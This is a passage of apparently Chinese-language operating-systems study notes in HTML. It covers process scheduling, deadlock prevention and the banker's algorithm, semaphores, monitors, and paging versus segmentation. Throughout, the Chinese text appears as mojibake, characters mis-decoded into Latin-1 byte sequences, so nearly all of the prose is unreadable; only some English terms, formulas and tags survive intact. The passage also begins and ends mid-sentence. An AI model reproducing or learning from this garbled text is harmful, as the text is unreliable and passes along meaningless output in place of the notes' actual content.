æ­¤æ¯”å€¼å˜å¤§ï¼Œæœ€ç»ˆåœ¨ç«äº‰ä¸­èµ¢äº†çŸ­è¿›ç¨‹ã€‚</p></li><li><p>è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼šå…­ç§</p><p>FCFS ï¼ˆFirst Come First Serveï¼‰ã€RRï¼ˆRound Robinï¼‰ã€SPNï¼ˆSTFï¼‰ï¼ˆShortProcess / Task Next/Firstï¼‰ã€SRTï¼ˆShort Remaining Timeï¼‰ã€HRRNï¼ˆHighResponse Rate Nextï¼‰ã€FBã€‚</p></li><li><p>èƒ½ä»ä¸€ç§çŠ¶æ€è½¬å˜ä¸º 3 ç§çŠ¶æ€çš„æ˜¯ï¼šRunnig æ‰§è¡ŒçŠ¶æ€ã€‚</p></li></ol><h2 id="å¹¶å‘æ­»é”ä¸é¥¥é¥¿">å¹¶å‘ï¼šæ­»é”ä¸é¥¥é¥¿</h2><h3 id="æ­»é”">æ­»é”</h3><ol type="1"><li><p>8 ä¸ªèµ„æºï¼Œ K ä¸ªè¿›ç¨‹ç«äº‰ï¼Œæ¯ä¸ªè¿›ç¨‹è‡³å°‘éœ€è¦ 3ä¸ªèµ„æºï¼Œæœ€å¤šå¤šå°‘ä¸ªè¿›ç¨‹ä¸å‘ç”Ÿæ­»é”ï¼Œæœ€å°‘å¤šå°‘ä¸ªè¿›ç¨‹å‘ç”Ÿæ­»é”ï¼Ÿ</p><p>(3-1) * K + 1 â‰¤ 8 â†’ k = 3, å› æ­¤æœ€å¤š 3 å°è¿›ç¨‹ä¸å‘ç”Ÿæ­»é”, æœ€å°‘ 4å°è¿›ç¨‹å‘ç”Ÿæ­»é”ã€‚</p><p><strong><em>æ‰©å±•</em></strong>ï¼š</p><p>n ä¸ªèµ„æºï¼Œ K ä¸ªè¿›ç¨‹ç«äº‰ï¼Œæ¯ä¸ªè¿›ç¨‹è‡³å°‘éœ€è¦ num_perä¸ªèµ„æºï¼Œæœ€å¤šå¤šå°‘ä¸ªè¿›ç¨‹ä¸å‘ç”Ÿæ­»é”ï¼Œæœ€å°‘å¤šå°‘ä¸ªè¿›ç¨‹å‘ç”Ÿæ­»é”ï¼Ÿ</p><p>(num_per - 1) * K + 1 â‰¤ n â†’ å› æ­¤æœ€å¤š k å°è¿›ç¨‹ä¸å‘ç”Ÿæ­»é”ï¼Œ æœ€å°‘ k+1å°è¿›ç¨‹å‘ç”Ÿæ­»é”ã€‚</p></li><li><p>é€šå¸¸ä¸é‡‡ç”¨ä»éæ­»é”è¿›ç¨‹å¤„æŠ¢å¤ºèµ„æºçš„æ–¹å¼è§£é™¤æ­»é”ã€‚</p></li><li><p>å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•èƒ½è¾ƒå¥½åœ°æ»¡è¶³å„ç±»ç”¨æˆ·çš„éœ€æ±‚ã€‚</p></li><li><p>ä»»ä½•ä¸¤ä¸ªå¹¶å‘è¿›ç¨‹ä¹‹é—´å¯èƒ½å­˜åœ¨åŒæ­¥æˆ–äº’æ–¥å…³ç³»</p><p>æˆ‘ä»¬æŠŠå¼‚æ­¥ç¯å¢ƒä¸‹çš„ä¸€ç»„å¹¶å‘è¿›ç¨‹å› ç›´æ¥åˆ¶çº¦è€Œäº’ç›¸å‘é€æ¶ˆæ¯ã€è¿›è¡Œäº’ç›¸åˆä½œã€äº’ç›¸ç­‰å¾…ï¼Œä½¿å¾—å„è¿›ç¨‹æŒ‰ä¸€å®šçš„é€Ÿåº¦æ‰§è¡Œçš„è¿‡ç¨‹ç§°ä¸ºè¿›ç¨‹é—´çš„åŒæ­¥ï¼Œå®é™…ä¸Šä¸æ˜¯æ‰€æœ‰çš„ç¨‹åºé—´éƒ½å­˜åœ¨ç›´æ¥åˆ¶çº¦å…³ç³»ã€‚å› æ­¤å¹¶ä¸æ˜¯ä»»æ„ä¸¤ä¸ªå¹¶å‘è¿›ç¨‹éƒ½å­˜åœ¨åŒæ­¥å…³ç³»ã€‚</p><p>å¦‚æœä¸¤ä¸ªå¹¶å‘ç¨‹åºä¸ºäº’æ–¥å…³ç³»ï¼Œåˆ™å¿…å®šå­˜åœ¨ä¸´ç•ŒåŒºï¼Œä½†æ˜¯å®é™…ä¸Šä¸æ˜¯æ‰€æœ‰çš„å¹¶å‘ç¨‹åºä¹‹é—´éƒ½å­˜åœ¨ä¸´ç•ŒåŒºã€‚å› æ­¤å¹¶ä¸æ˜¯ä»»æ„ä¸¤ä¸ªå¹¶å‘è¿›ç¨‹éƒ½å­˜åœ¨äº’æ–¥å…³ç³»ã€‚</p><p>ç»¼ä¸Šï¼šä»»ä½•ä¸¤ä¸ªå¹¶å‘è¿›ç¨‹ä¹‹é—´å¯èƒ½å­˜åœ¨åŒæ­¥æˆ–äº’æ–¥å…³ç³»ã€‚</p></li><li><p>å®ç°äº’æ–¥çš„æ–¹æ³•</p><ol type="1"><li>ä¸¥æ ¼è½®æ¢ æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡éƒ½ä»å¤´æ‰§è¡Œåˆ°å°¾</li><li>å±è”½ä¸­æ–­ï¼ˆä¸­æ–­æ–¹æ³•ï¼‰åˆšåˆšè¿›å…¥ä¸´ç•ŒåŒºæ—¶å°±å±è”½ä¸­æ–­ï¼Œåˆšè¦å‡ºä¸´ç•ŒåŒºå°±æ‰“å¼€ä¸­æ–­</li><li>ä¸“ç”¨æœºå™¨æŒ‡ä»¤ Test_and_setã€test_and_clear ã€exchange</li><li>è½¯ä»¶æ–¹æ³•</li><li>ä¿¡å·é‡</li></ol></li><li><p>å¤„ç†æ­»é”çš„ä¸‰ç§æ–¹æ³•</p><ul><li><p>æ­»é”é¢„é˜²</p><ul><li><p>ç›´æ¥æ­»é”é¢„é˜²</p><p>é˜²æ­¢å¾ªç¯ç­‰å¾…çš„å‘ç”Ÿ</p><p>å¾ªç¯ç­‰å¾…å¯ä»¥é€šè¿‡å®šä¹‰èµ„æºç±»å‹çš„çº¿æ€§é¡ºåºæ¥é¢„é˜²ã€‚</p><p>èµ„æºæœ‰åºåˆ†é…æ³•ï¼š</p><p>èµ„æºæœ‰åºåˆ†é…æ³•å°†èµ„æºæŒ‰æŸç§è§„åˆ™å¯¹ç³»ç»Ÿä¸­çš„æ‰€æœ‰èµ„æºç»Ÿä¸€ç¼–å·ï¼Œç”³è¯·çš„æ—¶å€™å¿…é¡»æŒ‰ç…§ç¼–å·çš„é¡ºåºç”³è¯·ã€‚å¯¹è¿›è¡Œå¿…é¡»ä½¿ç”¨çš„åŒç±»èµ„æºï¼Œå¿…é¡»ä¸€æ¬¡ç”³è¯·ï¼›ä¸åŒç±»çš„èµ„æºå¿…é¡»æŒ‰ç…§èµ„æºç¼–å·é¡ºåºç”³è¯·ï¼Œè¿™æ ·å°±ç ´åäº†æ­»é”ç¯è·¯ã€‚</p></li><li><p>é—´æ¥æ­»é”é¢„é˜²</p><p>é˜²æ­¢å½¢æˆæ­»é”çš„å‰ä¸‰ä¸ªå¿…è¦æ¡ä»¶ï¼ˆäº’æ–¥ã€å æœ‰ä¸”ç­‰å¾…ã€ä¸å¯æŠ¢å ï¼‰ä¸­çš„ä»»ä½•ä¸€ä¸ªå‘ç”Ÿã€‚</p><p>äº’æ–¥ï¼šä¸å¯èƒ½ç¦æ­¢ï¼Œå› ä¸ºå¦‚æœéœ€è¦å¯¹èµ„æºè¿›è¡Œäº’æ–¥è®¿é—®ï¼Œé‚£æ“ä½œç³»ç»Ÿå°±å¿…é¡»æ”¯æŒäº’æ–¥</p><p>å æœ‰ä¸”ç­‰å¾…ï¼šå¯ä»¥è¦æ±‚è¿›ç¨‹ä¸€æ¬¡æ€§çš„è¯·æ±‚æ‰€æœ‰çš„èµ„æºï¼Œå¹¶é˜»å¡è¿™ä¸ªè¿›ç¨‹ï¼Œç›´åˆ°æ‰€æœ‰è¯·æ±‚å¾—åˆ°æ»¡è¶³ã€‚</p><p>ä¸å¯æŠ¢å ï¼š</p><ol type="1"><li>å æœ‰æŸäº›èµ„æºçš„è¿›ç¨‹è¿›ä¸€æ­¥ç”³è¯·èµ„æºæ—¶è‹¥è¢«æ‹’ç»ï¼Œåˆ™è¯¥è¿›ç¨‹å¿…é¡»é‡Šæ”¾å…¶æœ€åˆå æœ‰çš„èµ„æºï¼Œå¿…è¦æ—¶å¯å†æ¬¡ç”³è¯·è¿™äº›èµ„æºå’Œå…¶ä»–èµ„æºã€‚</li><li>ä¸€ä¸ªè¿›ç¨‹è¯·æ±‚å½“å‰è¢«å¦ä¸€ä¸ªè¿›ç¨‹å æœ‰çš„èµ„æºæ—¶ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æŠ¢å å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œè¦æ±‚å®ƒé‡Šæ”¾èµ„æºã€‚</li></ol></li></ul></li><li><p>æ­»é”é¿å…</p><p>é€šè¿‡ä¸€å®šçš„ç­–ç•¥ï¼Œæ˜æ™ºåœ°é€‰æ‹©æ¥ä½¿å¾—ï¼šå‰ä¸‰ä¸ªå¿…è¦æ¡ä»¶æ— æ³•æ¨å‡ºç¬¬å››ä¸ªæ¡ä»¶ï¼ˆå¾ªç¯ç­‰å¾…ï¼‰ï¼Œä»è€Œé¿å…æ­»é”ã€‚</p><p>é“¶è¡Œå®¶ç®—æ³•</p></li><li><p>æ­»é”æ£€æµ‹</p></li></ul></li><li><p>æ­»é”é¿å…ç®—æ³•ï¼šé“¶è¡Œå®¶ç®—æ³•</p><ol type="1"><li><p>æ•°æ®ç»“æ„</p><p>å¯åˆ©ç”¨èµ„æºå‘é‡</p><p>æœ€å¤§éœ€æ±‚çŸ©é˜µ Maxï¼šæœ€å¤§éœ€æ±‚çš„æƒ…å†µ</p><p>åˆ†é…çŸ©é˜µ Allocation ï¼šå·²åˆ†é…çš„æƒ…å†µ</p><p>éœ€æ±‚çŸ©é˜µ Needï¼šå°šéœ€çš„èµ„æºæƒ…å†µ</p><p>Needï¼»i, jï¼½=Maxï¼»i, jï¼½-Allocationï¼»i, jï¼½</p></li></ol></li><li><p>ä¸é€‚å½“çš„è¿›ç¨‹æ¨è¿›é¡ºåºä¹Ÿå¯èƒ½äº§ç”Ÿæ­»é”ã€‚åˆç†çš„è¿›ç¨‹æ¨è¿›é¡ºåºå¯ä»¥é™ä½æ­»é”å‡ºç°çš„å¯èƒ½ï¼Œä½†æ˜¯å½“å››ä¸ªå¿…è¦æ¡ä»¶å­˜åœ¨æ—¶ï¼Œè¿˜æ˜¯æœ‰å‡ºç°æ­»é”çš„å¯èƒ½ï¼›</p></li></ol><h3 id="ä¿¡å·é‡">ä¿¡å·é‡</h3><ol type="1"><li><p>åŸè¯­æ˜¯ä¸å¯ä¸­æ–­çš„æŒ‡ä»¤åºåˆ—ã€‚</p><p>æœ€å¤§ç‰¹ç‚¹æ˜¯æ‰§è¡Œè¿‡ç¨‹ä¸å¯ä¸­æ–­ã€‚</p><p>ç”¨æ¥å®ç°è¿›ç¨‹åŒæ­¥ä¸äº’æ–¥çš„ PVæ“ä½œå®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ªä¸å¯è¢«ä¸­æ–­çš„è¿‡ç¨‹ç»„æˆçš„</p></li><li><p>ä¿¡å·é‡åŸå­æ‰§è¡Œçš„é—®é¢˜ï¼Œä¸€èˆ¬æƒ…å†µä¸‹é€šè¿‡ä¸¤ç§æ–¹å¼è§£å†³ï¼š</p><ul><li>å•å¤„ç†å™¨ä¸­åœ¨æ‰§è¡Œ wait() å’Œ signal() æ“ä½œæ—¶ç¦æ­¢ä¸­æ–­</li><li>åœ¨å¤šå¤„ç†å™¨ä¸­æä¾›å…¶ä»–åŠ é”æœºåˆ¶ï¼ˆå¦‚è‡ªæ—‹é”ï¼‰</li></ul></li><li><p>ä¿¡å·é‡çš„åŠŸèƒ½</p><p>ä¿¡å·é‡å¯ä»¥ç”¨äºå®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œäº’æ–¥ï¼Œå¯ä»¥æè¿°å¹¶å‘è¿›ç¨‹æ‰§è¡Œçš„å‰è¶‹å…³ç³»ã€‚</p></li><li><p>é™¤äº†åˆå§‹åŒ–å¤–ï¼Œä¿¡å·é‡åªèƒ½é€šè¿‡ä¸¤ä¸ª<em>æ ‡å‡†åŸå­æ“ä½œ</em>ï¼šwait() å’Œsignal()æ¥è®¿é—®ï¼Œåˆ†åˆ«ä¸ºä¿¡å·é‡å‡ä¸€å’ŒåŠ ä¸€ã€‚ è¯´ â€œ ä¿¡å·é‡çš„å€¼åªèƒ½é€šè¿‡wait/signal æ¥ä¿®æ”¹â€ ä¹Ÿæ˜¯å¯¹çš„</p><p>ä¿¡å·é‡åˆå€¼ä¸ºéè´Ÿçš„æ•´æ•°å˜é‡</p><p>é€šå¸¸åœ¨è¿›ç¨‹å¯¹ä¿¡å·é‡å‡ 1ä¹‹å‰ï¼Œæ— æ³•æå‰çŸ¥é“è¯¥ä¿¡å·é‡æ˜¯å¦ä¼šé˜»å¡ã€‚åªæœ‰åœ¨ä¿¡å·é‡å‡ä¸€åå°äº0ï¼Œä¿¡å·é‡æ‰ä¼šè‡ªèº«é˜»å¡</p></li><li><p>ç”¨ PV æ“ä½œå®ç°è¿›ç¨‹åŒæ­¥ï¼Œä¿¡å·é‡çš„åˆå€¼ç”±ç”¨æˆ·ç¡®å®š</p><p>ç”¨ PV æ“ä½œå®ç°åŒæ­¥æ—¶ï¼Œä¸€å®šè¦æ ¹æ®å…·ä½“æƒ…å†µæ¥å®šä¹‰ä¿¡å·é‡å’Œè°ƒç”¨ P æ“ä½œæˆ– Væ“ä½œ</p></li><li><p>è®¾ç³»ç»Ÿæœ‰ 10 ä¸ªå¹¶å‘è¿›ç¨‹ï¼Œé€šè¿‡ PVæ“ä½œåŸè¯­å…±äº«åŒä¸€ä¸´ç•Œèµ„æºï¼Œè‹¥è¯¥ä¸´ç•Œèµ„æºäº’æ–¥ä¿¡å·é‡ä¸º MUTEXï¼Œåˆ™ MUTEXçš„å€¼åŸŸä¸º [ -9, 1 ]ã€‚</p><p>ç”¨ä¿¡å·é‡å®ç°è¿›ç¨‹çš„äº’æ–¥ï¼Œåˆå€¼ä¸€èˆ¬è®¾ä¸º 1ï¼Œè€Œæ¯ä¸ªè¿›ç¨‹æ‰§è¡Œä¸€æ¬¡ Pæ“ä½œåï¼Œä¿¡å·é‡å€¼å‡ 1ã€‚</p></li><li><p>ä¸´ç•Œèµ„æºä¸ä¸´ç•ŒåŒº</p><ul><li><p>ä¸´ç•Œèµ„æºæ˜¯æŒ‡æ¯æ¬¡ä»…å…è®¸ä¸€ä¸ªè¿›ç¨‹è®¿é—®ï¼ˆå¿…é¡»äº’æ–¥ä½¿ç”¨ï¼‰çš„èµ„æºã€‚</p><p>å±äºä¸´ç•Œèµ„æºçš„ç¡¬ä»¶æœ‰æ‰“å°æœºã€ç£å¸¦æœºç­‰,è½¯ä»¶æœ‰æ¶ˆæ¯ç¼“å†²é˜Ÿåˆ—ã€å˜é‡ã€æ•°ç»„ã€ç¼“å†²åŒºç­‰ã€‚</p></li><li><p>ä¸´ç•ŒåŒºï¼šè¿›ç¨‹ä¸­è®¿é—®ä¸´ç•Œèµ„æºçš„é‚£æ®µä»£ç </p></li><li><p>åŒæ­¥å‡†åˆ™ï¼ˆä¸´ç•ŒåŒºçš„ä½¿ç”¨çš„åŸåˆ™ï¼‰ï¼šç©ºé—²è®©è¿›ã€å¿™åˆ™ç­‰å¾…ã€æœ‰é™ç­‰å¾…ã€è®©æƒç­‰å¾…ã€‚</p><p>1.ç©ºé—²è®©è¿›ï¼šä¸´ç•ŒåŒºç©ºé—²æ—¶ï¼Œå¯ä»¥å…è®¸ä¸€ä¸ªè¯·æ±‚è¿›å…¥ä¸´ç•ŒåŒºçš„è¿›ç¨‹ç«‹å³è¿›å…¥ä¸´ç•ŒåŒºã€‚</p><p>2.å¿™åˆ™ç­‰å¾…ï¼šå½“å·²æœ‰è¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œå…¶ä»–è¯•å›¾è¿›å…¥ä¸´ç•ŒåŒºçš„è¿›ç¨‹å¿…é¡»ç­‰å¾…ã€‚</p><p>3.æœ‰é™ç­‰å¾…ï¼šå¯¹è¯·æ±‚è®¿é—®çš„è¿›ç¨‹ï¼Œåº”ä¿è¯èƒ½åœ¨æœ‰é™æ—¶é—´å†…è¿›å…¥ä¸´ç•ŒåŒºã€‚</p><p>4.è®©æƒç­‰å¾…ï¼šå½“è¿›ç¨‹ä¸èƒ½è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œåº”ç«‹å³é‡Šæ”¾å¤„ç†å™¨ï¼Œé˜²æ­¢è¿›ç¨‹å¿™ç­‰å¾…ã€‚</p></li></ul></li><li><p>äºŒå…ƒä¿¡å·é‡å¯ä»¥ä¸”åªèƒ½åˆå§‹åŒ–ä¸º 0 æˆ– 1ã€‚</p></li><li><p>è¿›ç¨‹é—´é€šä¿¡çš„æ–¹å¼ï¼š</p><ul><li><p>ä¿¡å·ï¼ˆsignal ï¼‰é€šä¿¡æœºåˆ¶ï¼›</p></li><li><p>ä¿¡å·é‡åŠå…¶åŸè¯­æ“ä½œï¼ˆPVã€è¯»å†™é”ã€ç®¡ç¨‹ï¼‰æ§åˆ¶çš„å…±äº«å­˜å‚¨åŒºï¼ˆsharedmemory ï¼‰é€šä¿¡æœºåˆ¶ï¼›</p></li><li><p>ç®¡é“ï¼ˆpipelineï¼‰æä¾›çš„å…±äº«æ–‡ä»¶ï¼ˆshared fileï¼‰é€šä¿¡æœºåˆ¶ï¼›</p></li><li><p>ä¿¡ç®±å’Œå‘ä¿¡/ æ”¶ä¿¡åŸè¯­çš„æ¶ˆæ¯ä¼ é€’ï¼ˆmessage passing ï¼‰é€šä¿¡æœºåˆ¶ã€‚</p><p>å…¶ä¸­å‰ä¸¤ç§é€šä¿¡æ–¹å¼ç”±äºäº¤æ¢çš„ä¿¡æ¯é‡å°‘ä¸”æ•ˆç‡ä½ä¸‹ï¼Œæ•…ç§°ä¸ºä½<strong>çº§é€šä¿¡æœºåˆ¶</strong>ï¼Œç›¸åº”åœ°å¯æŠŠå‘ä¿¡å·/æ”¶ä¿¡å·åŠ PVä¹‹ç±»æ“ä½œç§°ä¸ºä½çº§é€šä¿¡åŸè¯­ï¼Œä»…é€‚ç”¨äºé›†ä¸­å¼æ“ä½œç³»ç»Ÿã€‚æ¶ˆæ¯ä¼ é€’æœºåˆ¶å±äº<strong>é«˜çº§é€šä¿¡æœºåˆ¶</strong>ï¼Œå…±äº«æ–‡ä»¶é€šä¿¡æœºåˆ¶æ˜¯æ¶ˆæ¯ä¼ é€’æœºåˆ¶çš„å˜ç§ï¼Œè¿™ä¸¤ç§é€šä¿¡æœºåˆ¶ï¼Œæ—¢é€‚ç”¨äºé›†ä¸­å¼æ“ä½œç³»ç»Ÿï¼Œåˆé€‚ç”¨äºåˆ†å¸ƒå¼æ“ä½œç³»ç»Ÿã€‚</p></li></ul></li><li><p>ä¿¡å·é‡è¡¨ç¤ºå½“å‰å¯ç”¨çš„ç›¸å…³èµ„æºæ•°ã€‚å½“ä¿¡å·é‡ K&gt;0 æ—¶ï¼Œè¡¨ç¤ºè¿˜æœ‰ Kä¸ªç›¸å…³èµ„æºå¯ç”¨ï¼›è€Œå½“ä¿¡å·é‡ K&lt;0æ—¶ï¼Œè¡¨ç¤ºæœ‰|K|ä¸ªè¿›ç¨‹åœ¨ç­‰å¾…è¯¥èµ„æºï¼ˆæ­£åœ¨ç­‰å¾…è§£é™¤é˜»å¡çš„è¿›ç¨‹æ•°é‡ä¸º |K|ï¼‰</p></li></ol><h3 id="ç®¡ç¨‹">ç®¡ç¨‹</h3><ol type="1"><li><p>ç®¡ç¨‹é€šè¿‡ä½¿ç”¨æ¡ä»¶å˜é‡æä¾›å¯¹åŒæ­¥çš„æ”¯æŒï¼Œè¿™äº›æ¡ä»¶å˜é‡åŒ…å«åœ¨ç®¡ç¨‹ä¸­ï¼Œå¹¶ä¸”åªæœ‰ç®¡ç¨‹æ‰èƒ½è®¿é—®ã€‚</p></li><li><p>ç®¡ç¨‹ä¸­çš„å±€éƒ¨æ•°æ®å˜é‡åªèƒ½ç”±ç®¡ç¨‹å†…å®šä¹‰çš„è¿‡ç¨‹æ¥è¿›ç¨‹è®¿é—®ï¼Œä¸èƒ½è¢«å¤–éƒ¨ç›´æ¥è®¿é—®</p></li><li><p>å½“ä¸€ä¸ªè¿›ç¨‹åœ¨ç®¡ç¨‹ä¸­æ‰§è¡Œæ—¶ï¼Œè°ƒç”¨ç®¡ç¨‹çš„å…¶ä»–è¿›ç¨‹éƒ½ä¼šè¢«é˜»å¡ï¼Œè¿™æ ·æ‰èƒ½ä¿æŒåŒæ­¥æ€§</p></li><li><p>ç®¡ç¨‹ä¸­çš„ wait å’Œ signal ä¸å‹å·é‡ä¸åŒã€‚</p><p>ç®¡ç¨‹ä¸­çš„ signal()ä¼šé‡æ–°å¯åŠ¨ä¸€ä¸ªæ‚¬æŒ‚çš„è¿›ç¨‹ã€‚å¦‚æœæ²¡æœ‰è¿›ç¨‹æ‚¬æŒ‚ï¼Œé‚£ä¹ˆæ“ä½œ signal()å°±æ²¡æœ‰ä½œç”¨ï¼›å³å¦‚åŒæ²¡æœ‰æ‰§è¡Œï¼Œè¿™ä¸€æ“ä½œä¸ä¿¡å·é‡ç›¸å…³çš„æ“ä½œ signal()ä¸åŒï¼Œåè€…èƒ½å½±å“ä¿¡å·é‡çš„çŠ¶æ€</p></li></ol><h2 id="å­˜å‚¨ç®¡ç†">å­˜å‚¨ç®¡ç†</h2><ol type="1"><li><p>ç¨‹åºçš„å±€éƒ¨æ€§åŸç†</p><ol type="1"><li><p>æ—¶é—´å±€éƒ¨æ€§</p></li><li><p>ç©ºé—´å±€éƒ¨æ€§</p></li></ol></li><li><p>â€è™šæ‹Ÿå­˜å‚¨å™¨çš„åœ°å€ç©ºé—´å¤§å° = å†…å­˜å®¹é‡ + è¾…å­˜ï¼ˆå¤–å­˜ï¼‰å®¹é‡â€œå¯ä»¥çœ‹ä½œæ˜¯å¯¹çš„ã€‚</p><p>æœ€å¤§å®¹é‡å–å†³äº CPU åœ°å€ï¼Œå®é™…å®¹é‡å–å†³äºå†…å¤–å­˜ä¹‹å’Œä»¥åŠ CPU åœ°å€ã€‚</p><p>æ¯”å¦‚ CPU å¯»å€æ˜¯ 32 ä½ï¼Œé‚£ä¹ˆè™šæ‹Ÿå†…å­˜çš„æœ€å¤§å®¹é‡å°±æ˜¯ 2^32</p><p>æ¯”å¦‚å†…å­˜ 1Mï¼Œå¤–å­˜ 400Mï¼Œ32 ä½ï¼Œé‚£ä¹ˆå®é™…å®¹é‡å°±æ˜¯ min(1+400M,2^32B)ï¼ˆå‡è®¾è¯¥ç³»ç»ŸæŒ‰å­—èŠ‚ç¼–å€ï¼‰</p></li><li><p>å¤šçº§é¡µè¡¨æ³¨æ„æœ€å¤–å±‚å«åšä¸€çº§ï¼Œä¾‹å¦‚ï¼šäºŒçº§é¡µè¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728215319.png"alt="page table" /></p></li><li><p>åˆ†æ®µä¸åˆ†é¡µçš„ä¸»è¦åŒºåˆ«</p><ol type="1"><li><p>é¡µæ˜¯ä¿¡æ¯çš„ç‰©ç†å•ä½</p><p>æ®µæ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œåˆ†æ®µçš„ç›®çš„æ˜¯ä¸ºäº†èƒ½æ›´å¥½çš„æ»¡è¶³ç”¨æˆ·çš„éœ€è¦ã€‚</p></li><li><p>é¡µçš„å¤§å°å›ºå®šä¸”ç”±ç³»ç»Ÿå†³å®š</p><p>æ®µçš„å¤§å°ä¸å›ºå®šï¼Œå†³å®šäºç”¨æˆ·æ‰€ç¼–å†™çš„ç¨‹åºï¼Œé€šå¸¸ç”±ç¼–è¯‘å™¨åœ¨å¯¹æºç¨‹åºè¿›è¡Œç¼–å†™æ—¶ï¼Œæ ¹æ®ä¿¡æ¯çš„æ€§è´¨æ¥åˆ’åˆ†ã€‚</p></li><li><p>é¡µçš„ä½œä¸šåœ°å€ç©ºé—´æ˜¯ä¸€ç»´çš„ï¼Œå³ï¼šå•ä¸€çš„çº¿æ€§åœ°å€ç©ºé—´</p><p>æ®µçš„ä½œä¸šåœ°å€ç©ºé—´æ˜¯äºŒç»´çš„ï¼Œç¨‹åºå‘˜åœ¨æ ‡è¯†ä¸€ä¸ªåœ°å€æ—¶ï¼Œæ—¢éœ€è¦ç»™å‡ºæ®µåï¼Œåˆéœ€è¦ç»™å‡ºæ®µå†…åœ°å€ã€‚</p></li></ol></li><li><p>æ®µå¼ç®¡ç†</p><p>æ®µçš„é•¿åº¦åœ¨è¿è¡ŒæœŸé—´æ˜¯å¯ä»¥åŠ¨æ€å˜åŒ–çš„ã€‚æ®µåˆ’åˆ†ä¹‹åï¼Œä»ç„¶å¯ä»¥æ”¹å˜å…¶åœ¨å­˜å‚¨ç©ºé—´çš„å¤§å°ã€‚</p><p>æ®µæœ‰æœ€å¤§é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯è¯¥é™åˆ¶å¯ä»¥åœ¨å†…æ ¸ç‰¹æƒä¸‹ä¿®æ”¹ã€‚</p></li><li><p>å†…éƒ¨ç¢ç‰‡ä¸å¤–éƒ¨ç¢ç‰‡</p><p>å†…éƒ¨ç¢ç‰‡ï¼š</p><p>åœ¨å†…å­˜ç®¡ç†ä¸­ï¼Œå†…éƒ¨ç¢ç‰‡æ˜¯å·²ç»è¢«åˆ†é…å‡ºå»çš„çš„å†…å­˜ç©ºé—´å¤§äºè¯·æ±‚æ‰€éœ€çš„å†…å­˜ç©ºé—´ã€‚</p><p>å¤–éƒ¨ç¢ç‰‡ï¼š</p><p>å¤–éƒ¨ç¢ç‰‡æ˜¯æŒ‡è¿˜æ²¡æœ‰åˆ†é…å‡ºå»ï¼Œä½†æ˜¯ç”±äºå¤§å°å¤ªå°è€Œæ— æ³•åˆ†é…ç»™ç”³è¯·ç©ºé—´çš„æ–°è¿›ç¨‹çš„å†…å­˜ç©ºé—´ç©ºé—²å—ã€‚</p><p>å›ºå®šåˆ†åŒºå­˜åœ¨å†…éƒ¨ç¢ç‰‡ï¼Œå¯å˜å¼åˆ†åŒºåˆ†é…ä¼šå­˜åœ¨å¤–éƒ¨ç¢ç‰‡ï¼›</p><p>ç¦»æ•£åˆ†é…</p><ol type="1"><li><p>é¡µå¼å­˜åœ¨<strong>å†…éƒ¨ç¢ç‰‡</strong></p><p>å°†è¿›ç¨‹åˆ†æˆè‹¥å¹²ä¸ªå¤§å°ç›¸ç­‰çš„é¡µï¼Œå°†å†…å­˜åˆ†æˆè‹¥å¹²ä¸ªå¤§å°ç›¸ç­‰çš„é¡µæ¡†ï¼Œæ‰€ä»¥è¿›ç¨‹æœ€åä¸€ä¸ªé¡µçš„ç©ºé—´ä¸ä¼šè¢«å®Œå…¨å æ»¡ï¼ˆå› ä¸ºæ— æ³•ä¿è¯è¿›ç¨‹å¤§å°æ­£å¥½æ•´é™¤é¡µçš„å¤§å°ï¼‰ï¼Œå½“è¢«æ”¾å…¥å†…å­˜æ—¶ï¼Œæœ€åä¸€é¡µä¾¿äº§ç”Ÿäº†å†…éƒ¨ç¢ç‰‡ã€‚</p></li><li><p>æ®µå¼å­˜åœ¨<strong>å¤–éƒ¨ç¢ç‰‡</strong></p><p>åˆ†æ®µç±»ä¼¼äºåŠ¨æ€åˆ†åŒºï¼Œè·ŸåŠ¨æ€åˆ†åŒºçš„åŸç†åŒºåˆ«åœ¨åˆ†æ®µå¯ä»¥ä¸è¿ç»­ã€‚æ®µçš„æ•°ç›®å’Œå¤§å°éƒ½æ˜¯å¯å˜çš„ã€‚ä¸ºäº†å…±äº«è¦åˆ†æ®µï¼Œåœ¨æ®µçš„æ¢å…¥æ¢å‡ºæ—¶å½¢æˆå¤–éƒ¨ç¢ç‰‡ï¼Œæ¯”å¦‚5 K çš„æ®µæ¢å‡ºåï¼Œæœ‰ä¸€ä¸ª 4 k çš„æ®µè¿›æ¥æ”¾åˆ°åŸæ¥ 5 k çš„åœ°æ–¹ï¼Œäºæ˜¯å½¢æˆ 1 kçš„å¤–éƒ¨ç¢ç‰‡ã€‚ï¼ˆä½†åŠ¨æ€åˆ†åŒºä¸åŒçš„æ˜¯ï¼Œå› ä¸ºå¯ä»¥ä¸è¿ç»­ï¼Œæ‰€ä»¥ä¸¤å—å†…å­˜ä¹‹é—´å¦‚æœè¾ƒå¤§å¯ä»¥ç»§ç»­å¡«å……è¿›ç¨‹ï¼Œå› è€Œåªä¼šæœ‰è¾ƒå°çš„å¤–éƒ¨ç¢ç‰‡ï¼ŒåŠ¨æ€åˆ†åŒºçš„å¤–éƒ¨ç¢ç‰‡åˆ™è¾ƒå¤§ï¼‰ï¼Œä½†æ˜¯æ²¡æœ‰å†…éƒ¨ç¢ç‰‡ã€‚</p></li><li><p>æ®µé¡µå¼å­˜åœ¨<strong>å†…éƒ¨ç¢ç‰‡</strong></p><p>å°†ç”¨æˆ·çš„åœ°å€ç©ºé—´åˆ†æˆè‹¥å¹²ä¸ªæ®µï¼Œæ¯ä¸ªæ®µå†åˆ†æˆè‹¥å¹²ä¸ªå¤§å°å›ºå®šç›¸ç­‰çš„é¡µï¼Œé¡µçš„é•¿åº¦ç­‰äºå†…å­˜ä¸­é¡µæ¡†çš„å¤§å°ï¼Œå› 